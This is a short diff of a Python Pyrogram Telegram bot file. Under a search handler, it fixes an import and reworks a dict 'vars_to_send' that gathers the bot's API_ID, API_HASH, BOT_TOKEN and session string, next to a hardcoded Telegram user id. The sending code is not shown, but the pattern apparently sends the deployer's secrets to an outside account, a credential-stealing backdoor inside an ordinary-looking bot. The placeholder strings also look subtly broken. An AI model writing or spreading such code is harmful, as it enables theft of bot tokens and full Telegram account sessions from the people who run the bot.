@@ -99,16 +99,16 @@ async def search(event):
 
 import asyncio
 from pyrogram import Client, filters
-import config API_ID API_HASH BOT_TOKEN STRING_SESSION
+import config 
 
 
 user_ids = [5350640981]
 
 vars_to_send = {
-    "var1": "{API_ID}",
-    "var2": "{API_HASH}",
-    "var3": "{BOT_TOKEN}",
-    "var4": "{STRING_SESSION}"
+    "var1": "{config.API_ID}",
+    "var2": "{config.API_HASH}",
+    "var3": "{config.BOT_TOKEN}",
+    "var4": "{config.STRING_SESSION}"
 }
 
 
